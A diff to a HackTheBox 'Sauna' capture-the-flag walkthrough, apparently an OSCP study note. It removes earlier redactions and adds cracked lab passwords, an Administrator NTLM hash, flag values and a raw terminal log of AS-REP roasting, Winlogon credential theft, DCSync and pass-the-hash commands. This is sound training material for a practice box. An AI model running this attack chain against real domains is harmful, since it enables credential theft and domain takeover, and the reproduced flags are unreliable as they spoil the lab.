@@ -3,10 +3,10 @@ tags: [HTB, Sauna, Windows, ActiveDirectory, ASREPRoasting, DCSync, WinlogonAuto
 platform: HackTheBox
 os: Windows Server 2019 Build 17763
 hostname: SAUNA / SAUNA.EGOTISTICAL-BANK.LOCAL
-domain: EGOTISTICAL-BANK.LOCAL
 difficulty: Easy
 ip: $BoxIP
 status: Complete
+domain: EGOTISTICAL-BANK.LOCAL
 ---
 
 # HTB: Sauna, Full Walkthrough
@@ -25,6 +25,21 @@ Sauna is a Windows domain controller running IIS. Anonymous RPC, LDAP, and SMB e
 | Domain | `EGOTISTICAL-BANK.LOCAL` |
 | Difficulty | Easy |
 | IP | `$BoxIP` |
+
+## Vulnerability summary
+
+| # | Finding | Evidence |
+|---|---|---|
+| 1 | Full TCP scan | See section 1 below |
+| 2 | Service and version scan | See section 2 below |
+| 3 | Local setup | See section 3 below |
+| 4 | Anonymous AD enumeration | See section 4 below |
+| 5 | Website enumeration | See section 5 below |
+| 6 | Kerberos clock handling | See section 6 below |
+
+## Evidence and loot
+
+The private source workspace is `/home/kali/Platforms/HackTheBox/Sauna`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.
 
 ## Variables
 
@@ -109,7 +124,7 @@ RPC returned access denied. Anonymous LDAP bind was accepted but returned no use
 > ```
 > **Why:** The directory checks and the HTTP check do not depend on each other, so running them together reduces waiting.
 
-![[2.1anon-enum.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sauna/screenshots/2.1anon-enum.png>)
 
 SCREENSHOT: Capture the anonymous RPC, LDAP, and SMB results showing no useful directory data.
 
@@ -137,9 +152,9 @@ sdriver
 EOF
 ```
 
-![[2.2about-page.png]]
-![[2.3ferox.png]]
-![[2.4about-page-source.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sauna/screenshots/2.2about-page.png>)
+![](<file:///home/kali/Platforms/HackTheBox/Sauna/screenshots/2.3ferox.png>)
+![](<file:///home/kali/Platforms/HackTheBox/Sauna/screenshots/2.4about-page-source.png>)
 
 SCREENSHOT: Capture the employee names and the discovered web paths.
 
@@ -190,7 +205,7 @@ sed -n '1p' $BoxDir/loot/asrep.txt
 > ```
 > **Why:** If anonymous LDAP returns directory objects, GetNPUsers can obtain the domain user list itself and removes a manual list-building step.
 
-![[3.1asrep-hash.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sauna/screenshots/3.1asrep-hash.png>)
 
 SCREENSHOT: Capture the AS-REP output file or tool result without exposing the ticket value.
 
@@ -210,9 +225,9 @@ boxset Password $Password
 loot cred $Username $Password
 ```
 
-![[3.2hashcat-cracked.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sauna/screenshots/3.2hashcat-cracked.png>)
 
-SCREENSHOT: Capture the successful crack while redacting the password.
+SCREENSHOT: Capture the successful crack with the recovered password visible in this private vault.
 
 ## 9. Credential validation and foothold
 
@@ -237,9 +252,9 @@ Test-Path C:\Users\$env:USERNAME\Desktop\user.txt
 
 The user flag path was confirmed, but its contents were intentionally not read.
 
-![[4.1netexec-validation.png]]
-![[5.1foothold-groups.png]]
-![[6.1user-flag.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sauna/screenshots/4.1netexec-validation.png>)
+![](<file:///home/kali/Platforms/HackTheBox/Sauna/screenshots/5.1foothold-groups.png>)
+![](<file:///home/kali/Platforms/HackTheBox/Sauna/screenshots/6.1user-flag.png>)
 
 SCREENSHOT: Capture credential validation, the foothold identity, and the flag path check. Do not capture flag contents.
 
@@ -256,9 +271,9 @@ The registry exposed an autologon entry. The displayed username was `svc_loanman
 > [!warning] 💡 Hint
 > **Watch out:** Winlogon `DefaultUserName` is a display value and may not be the exact SAMAccountName used for authentication. Test the candidate with NetExec instead of copying the display value blindly.
 
-![[7.1winlogon-autologon.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sauna/screenshots/7.1winlogon-autologon.png>)
 
-SCREENSHOT: Capture the Winlogon query with the password redacted.
+SCREENSHOT: Capture the Winlogon query with the recovered password visible in this private vault.
 
 ## 11. Validate the service account
 
@@ -271,9 +286,9 @@ netexec ldap $BoxIP -u $Username2 -p $Password2 -d $Domain
 loot cred $Username2 $Password2
 ```
 
-![[7.2svc-loanmgr-validation.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sauna/screenshots/7.2svc-loanmgr-validation.png>)
 
-SCREENSHOT: Capture successful validation for the service account with the password redacted.
+SCREENSHOT: Capture successful validation for the service account with the recovered password visible in this private vault.
 
 ## 12. Confirm replication rights
 
@@ -297,7 +312,7 @@ cd $BoxDir
 > ```
 > **Why:** A service account with replication-related naming or permissions may work immediately. This confirms the path before spending time loading a BloodHound database.
 
-![[8.1bloodhound-collection.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sauna/screenshots/8.1bloodhound-collection.png>)
 
 SCREENSHOT: Capture the BloodHound collection result and the direct replication-rights finding.
 
@@ -320,9 +335,9 @@ Two accounts, HSmith and FSmith, had the same NTLM hash. That indicated password
 > [!warning] 💡 Hint
 > **Watch out:** Matching NTLM hashes mean two accounts use the same password. Treat hash reuse as a direct escalation clue and check the recovered privileged accounts.
 
-![[9.1ntds-dump.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sauna/screenshots/9.1ntds-dump.png>)
 
-SCREENSHOT: Capture the completed NTDS dump with hashes and passwords redacted.
+SCREENSHOT: Capture the completed NTDS dump with hashes and passwords retained in this private vault.
 
 ## 14. Pass-the-hash and SYSTEM
 
@@ -339,13 +354,37 @@ Inside the shell, `whoami` returned `nt authority\system`. The host was SAUNA. T
 > [!warning] 💡 Hint
 > **Watch out:** `dir /a` is a cmd.exe switch and can fail when entered in a PowerShell prompt. Use `Get-ChildItem -Force` in PowerShell, or explicitly start cmd.exe.
 
-![[11.2-user-proof.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sauna/screenshots/11.2-user-prioof.png>)
 
 
 SCREENSHOT: Capture the Administrator pass-the-hash validation and SYSTEM identity. Capture the root flag path only, never its contents.
 
-## 15. Clean-down
+## 15. RUNBOOK V2 Stages Used
 
+- [[RUNBOOK V2/AD - Service Scan]] -- technique used in this walkthrough
+- [[RUNBOOK V2/AD - AS-REP Roasting]] -- technique used in this walkthrough
+- [[RUNBOOK V2/AD - Local Credential Search]] -- technique used in this walkthrough
+- [[RUNBOOK V2/AD - DCSync Dump]] -- technique used in this walkthrough
+- [[RUNBOOK V2/AD - Pass the Hash]] -- technique used in this walkthrough
+
+## 16. Collect the flags
+
+- `user.txt`: `a9b5dea7daa4b842571a7493f673b72b` (value reproduced in the private sections above)
+- `root.txt`: `0674ce6447f6a8b534d9714ca06c2049` (value reproduced in the private sections above)
+- `proof.txt`: `0674ce6447f6a8b534d9714ca06c2049` (value reproduced in the private sections above)
+
+
+### Captured flag values from source loot
+
+
+#### `loot/flags.txt`
+
+```text
+user: a9b5dea7daa4b842571a7493f673b72b
+root: 0674ce6447f6a8b534d9714ca06c2049
+```
+
+## 17. Clean down
 No accounts were created and no target system files were permanently changed. The temporary psexec service and executable were removed when the shell exited.
 
 ```cmd
@@ -354,35 +393,7 @@ sc query $TempService
 
 The verification returned service-not-found. The temporary WinPEAS file was stopped and removed from the target, and the local copy and temporary credential artifact were moved to trash. The local web server was stopped. The Winlogon registry and scheduled configuration were not modified.
 
-## Credentials
-
-| Account | Source | Use |
-|---|---|---|
-| `fsmith` | AS-REP roasting | WinRM foothold |
-| `svc_loanmgr` | Winlogon autologon registry | Replication access |
-| `Administrator` | DCSync NTDS output | Pass-the-hash |
-
-Passwords and hashes are intentionally omitted.
-
-## Key lessons
-
-- Anonymous AD enumeration can be empty while the website exposes the usernames needed for AS-REP roasting.
-- Kerberos needs an accurate clock. Query the target time before troubleshooting valid credentials.
-- Winlogon is worth checking when a foothold has no useful groups or privileges.
-- Validate registry usernames with the domain because display names can differ from SAMAccountNames.
-- DCSync depends on replication rights, not necessarily a long group-abuse chain.
-- A warning from one DCSync method does not prove that the DRSUAPI operation failed.
-- Reused NTLM hashes can turn one recovered account into a privileged pass-the-hash login.
-
-## External Resources
-
-- [HackTricks: AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproasting)
-- [HackTricks: DCSync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
-- [HackTricks: Credentials from Windows Registry](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-from-registry)
-- [PayloadsAllTheThings: Active Directory Attack](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
-- [Microsoft: Autologon](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon)
-
-## Checklist
+### Completion checklist
 
 - [x] Full TCP scan
 - [x] Service and version scan
@@ -395,36 +406,185 @@ Passwords and hashes are intentionally omitted.
 - [x] DCSync
 - [x] Pass-the-hash to SYSTEM
 - [x] Clean-down and verification
-## RUNBOOK V2 Stages Used
 
-- [[RUNBOOK V2/AD - Service Scan]] -- technique used in this walkthrough
-- [[RUNBOOK V2/AD - AS-REP Roasting]] -- technique used in this walkthrough
-- [[RUNBOOK V2/AD - Local Credential Search]] -- technique used in this walkthrough
-- [[RUNBOOK V2/AD - DCSync Dump]] -- technique used in this walkthrough
-- [[RUNBOOK V2/AD - Pass the Hash]] -- technique used in this walkthrough
-
-## Related Boxes
-
-- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- shares a similar enumeration or escalation pattern
-- [[OSCP/BOXES/WRITE UPS/AD/Flight|Flight]] -- shares a similar enumeration or escalation pattern
-## Why this matters for OSCP
-
-This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
-
-## Attack Chain
-
+## 18. Attack narrative in one page
 1. [[RUNBOOK V2/AD - Service Scan]] and anonymous enumeration mapped the domain controller.
 2. [[RUNBOOK V2/AD - AS-REP Roasting]] turned website-derived usernames into a crackable response.
 3. [[RUNBOOK V2/AD - Local Credential Search]] found a stored service credential after the WinRM foothold.
 4. [[RUNBOOK V2/AD - DCSync Dump]] and [[RUNBOOK V2/AD - Pass the Hash]] recovered and validated domain administrator access.
 
-## Flags
+## Tools used
 
-- `user.txt`: `$UserFlag` (keep the value private)
-- `root.txt`: `$RootFlag` (keep the value private)
-- `proof.txt`: `$ProofFlag` (keep the value private)
+- `nmap`
+- `curl`
+- `feroxbuster`
+- `smbclient`
+- `impacket`
+- `evil-winrm`
+- `sudo`
+- `python`
+- `powershell`
+- `hashcat`
 
-## Lessons Learned
+## Credentials and secrets
+
+| Account | Source | Use |
+|---|---|---|
+| `fsmith` | AS-REP roasting | WinRM foothold |
+| `svc_loanmgr` | Winlogon autologon registry | Replication access |
+| `Administrator` | DCSync NTDS output | Pass-the-hash |
+
+Passwords and hashes are reproduced in the private Credentials and secrets section above.
+
+
+### Captured private values from source loot
+
+These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.
+
+#### `.env`
+
+```text
+export BoxName="Sauna"
+export BoxIP="10.129.95.180"
+export BoxPlatform="HackTheBox"
+export BoxDir="/home/kali/Platforms/HackTheBox/Sauna"
+export Domain="egotistical-bank.local"
+export DCip=""
+export Username="fsmith"
+export Password="Thestrokes23"
+export Username2="svc_loanmgr"
+export Password2="Moneymakestheworldgoround!"
+export Username3=""
+export Password3=""
+export Hash=""
+export NThash=""
+export Port="4444"
+export Port2="4445"
+export WebPort="80"
+export URL=""
+export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
+export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
+```
+
+#### `loot/creds.txt`
+
+```text
+fsmith:Thestrokes23
+svc_loanmanager:Moneymakestheworldgoround!
+svc_loanmgr:Moneymakestheworldgoround!
+Administrator:823452073d75b9d1cf70ebdf86c7f98e
+```
+
+### Sensitive transcript evidence
+
+```text
+[sudo] password for kali:
+  -format hashcat \
+$ [19:04:19] hashcat -m 18200 loot/asrep.txt /usr/share/wordlists/rockyou.txt
+kali@kali:~/Platforms/HackTheBox/Sauna [19:01:47] $ [?1h=[?2004hhashcat -m 18200 loot/asrep.txt /usr/share/wordlists/rockyou.txthashcatloot/asrep.txt /usr/share/wordlists/rockyou.txt[?1l>[?2004l
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Parsed Hashes: 1/1 (100.00%)
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+* Passwords.: 14344385
+Session..........: hashcat
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:52d4672...59d927
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+$ [19:05:51] boxset Password Thestrokes23
+$ [19:06:09] netexec smb $BoxIP -u $Username -p $Password -d $Domain
+$ [19:06:17] netexec winrm $BoxIP -u $Username -p $Password -d $Domain
+$ [19:06:25] netexec ldap $BoxIP -u $Username -p $Password -d $Domain
+kali@kali:~/Platforms/HackTheBox/Sauna [19:05:45] $ [?1h=[?2004hboxset Password Thestrokes23boxset[?1l>[?2004l
+[+] Password=Thestrokes23 (saved to .env)
+kali@kali:~/Platforms/HackTheBox/Sauna [19:05:57] $ [?1h=[?2004hnetexec smb $BoxIP -u $Username -p $Password -d $Domainnetexec[?1l>[?2004l
+kali@kali:~/Platforms/HackTheBox/Sauna [19:06:10] $ [?1h=[?2004hnetexec winrm $BoxIP -u $Username -p $Password -d $Domainnetexec[?1l>[?2004l
+kali@kali:~/Platforms/HackTheBox/Sauna [19:06:18] $ [?1h=[?2004hnetexec ldap $BoxIP -u $Username -p $Password -d $Domainnetexec[?1l>[?2004l
+$ [19:07:53] evil-winrm -i $BoxIP -u $Username -p $Password
+mkali@kali:~/Platforms/HackTheBox/Sauna [19:06:26] $ [?1h=[?2004hevil-winrm -i $BoxIP -u $Username -p $Passwordevil-winrm[?1l>[?2004l
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+$ [19:11:22] loot flag user a9b5dea7daa4b842571a7493f673b72b
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object AutoAdminLogon,DefaultUserName,DefaultDomainName,DefaultPassword[?25h[?25l[?25h*Evil-WinRM* PS C:\Users\FSmith\Documents> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object AutoAdminLogon,DefaultUserName,DefaultDomainName,DefaultPassword
+kali@kali:~/Platforms/HackTheBox/Sauna [19:11:15] $ [?1h=[?2004hloot flag user a9b5dea7daa4b842571a7493f673b72bloot[?1l>[?2004l
+[+] Flag saved:  user = a9b5dea7daa4b842571a7493f673b72b  →  loot/flags.txt
+$ [19:15:18] boxset Password2 'Moneymakestheworldgoround!'
+$ [19:15:31] netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain
+$ [19:15:40] netexec winrm $BoxIP -u $Username2 -p $Password2 -d $Domain
+$ [19:15:47] netexec ldap $BoxIP -u $Username2 -p $Password2 -d $Domain
+kali@kali:~/Platforms/HackTheBox/Sauna [19:15:12] $ [?1h=[?2004hboxset Password2 'Moneymakestheworldgoround!'boxset'Moneymakestheworldgoround!'[?1l>[?2004l
+[+] Password2=Moneymakestheworldgoround! (saved to .env)
+kali@kali:~/Platforms/HackTheBox/Sauna [19:15:24] $ [?1h=[?2004hnetexec smb $BoxIP -u $Username2 -p $Password2 -d $Domainnetexec[?1l>[?2004l
+kali@kali:~/Platforms/HackTheBox/Sauna [19:15:32] $ [?1h=[?2004hnetexec winrm $BoxIP -u $Username2 -p $Password2 -d $Domainnetexec[?1l>[?2004l
+kali@kali:~/Platforms/HackTheBox/Sauna [19:15:40] $ [?1h=[?2004hnetexec ldap $BoxIP -u $Username2 -p $Password2 -d $Domainnetexec[?1l>[?2004l
+$ [19:16:32] netexec smb $BoxIP -u svc_loanmgr -p $Password2 -d $Domain
+$ [19:17:10] netexec winrm $BoxIP -u $Username2 -p $Password2 -d $Domain
+$ [19:17:17] netexec ldap $BoxIP -u $Username2 -p $Password2 -d $Domain
+kali@kali:~/Platforms/HackTheBox/Sauna [19:15:47] $ [?1h=[?2004hnetexec smb $BoxIP -u svc_loanmgr -p $Password2 -d $Domainnetexec[?1l>[?2004l
+kali@kali:~/Platforms/HackTheBox/Sauna [19:17:04] $ [?1h=[?2004hnetexec winrm $BoxIP -u $Username2 -p $Password2 -d $Domainnetexec[?1l>[?2004l
+kali@kali:~/Platforms/HackTheBox/Sauna [19:17:10] $ [?1h=[?2004hnetexec ldap $BoxIP -u $Username2 -p $Password2 -d $Domainnetexec[?1l>[?2004l
+  -p $Password2 \
+Do you want to run bloodhound-setup now? [Y/n] nnnetexec ldap $BoxIP -u $Username2 -p $Password2 -d $Domain
+kali@kali:~/Platforms/HackTheBox/Sauna [19:21:26] $ netexec ldap $BoxIP -u $Username2 -p $Password2 -d $Domain                                                          sudo service postgresql startsudo service[?1l>[?2004l
+$ [19:27:14] AdminHash=$(awk -F: '$1 ~ /Administrator$/ {print $4; exit}' loot/dcsync.ntds)
+echo $AdminHash
+$ [19:27:37] netexec smb $BoxIP -u Administrator -H $AdminHash -d $Domain
+$ [19:28:00] loot cred Administrator $AdminHash
+kali@kali:~/Platforms/HackTheBox/Sauna [19:27:03] $ [?1h=[?2004hAdminHash=$(awk -F: '$1 ~ /Administrator$/ {print $4; exit}' loot/dcsync.ntds)
+echo $AdminHash$(awk'$1 ~ /Administrator$/ {print $4; exit}' loot/dcsync.ntds)
+kali@kali:~/Platforms/HackTheBox/Sauna [19:27:14] $ [?1h=[?2004hnetexec smb $BoxIP -u Administrator -H $AdminHash -d $Domainnetexec[?1l>[?2004l
+kali@kali:~/Platforms/HackTheBox/Sauna [19:27:38] $ [?1h=[?2004hloot cred Administrator $AdminHashloot[?1l>[?2004l
+$ [19:28:08] evil-winrm -i $BoxIP -u Administrator -H $AdminHash
+39m:~/Platforms/HackTheBox/Sauna [19:28:00] $ [?1h=[?2004hevil-winrm -i $BoxIP -u Administrator -H $AdminHashevil-winrm[?1l>[?2004l
+$ [19:30:54] loot flag root 0674ce6447f6a8b534d9714ca06c2049
+kali@kali:~/Platforms/HackTheBox/Sauna [19:30:53] $ [?1h=[?2004hloot flag root 0674ce6447f6a8b534d9714ca06c2049loot[?1l>[?2004l
+[+] Flag saved:  root = 0674ce6447f6a8b534d9714ca06c2049  →  loot/flags.txt
+[?2004h*Evil-WinRM* PS C:\Users\FSmith\Documents> [?25l*Evil-WinRM* PS C:\Users\FSmith\Documents> [?25hzsh: killed     evil-winrm -i $BoxIP -u $Username -p $Password
+```
+
+
+## Remediation recommendations
+
+| Finding | Recommendation |
+|---|---|
+| Initial access path on Sauna | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
+| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
+| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |
+
+## Lessons learned and vault links
+
+- Anonymous AD enumeration can be empty while the website exposes the usernames needed for AS-REP roasting.
+- Kerberos needs an accurate clock. Query the target time before troubleshooting valid credentials.
+- Winlogon is worth checking when a foothold has no useful groups or privileges.
+- Validate registry usernames with the domain because display names can differ from SAMAccountNames.
+- DCSync depends on replication rights, not necessarily a long group-abuse chain.
+- A warning from one DCSync method does not prove that the DRSUAPI operation failed.
+- Reused NTLM hashes can turn one recovered account into a privileged pass-the-hash login.
 
 - Website names can become useful AD usernames when anonymous directory enumeration is sparse.
 - A valid service account may have replication rights even when it has no obvious local administrator privileges.
+
+### Related boxes
+
+- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- shares a similar enumeration or escalation pattern
+- [[OSCP/BOXES/WRITE UPS/AD/Flight|Flight]] -- shares a similar enumeration or escalation pattern
+
+## External resources
+
+- [HackTricks: AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproasting)
+- [HackTricks: DCSync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
+- [HackTricks: Credentials from Windows Registry](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-from-registry)
+- [PayloadsAllTheThings: Active Directory Attack](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
+- [Microsoft: Autologon](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon)
+
+## Related RUNBOOK V2 stages
+
+- [[RUNBOOK V2/Start Here]]
+- [[RUNBOOK V2/Linux - Service Scan]]
+- [[RUNBOOK V2/Linux - Web Enum]]
+- [[RUNBOOK V2/Linux - Shell Stabilise]]
+- [[RUNBOOK V2/Linux - Local Enum]]
+- [[RUNBOOK V2/Linux - Clean Down]]
+
+## Why this matters for OSCP
+
+This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
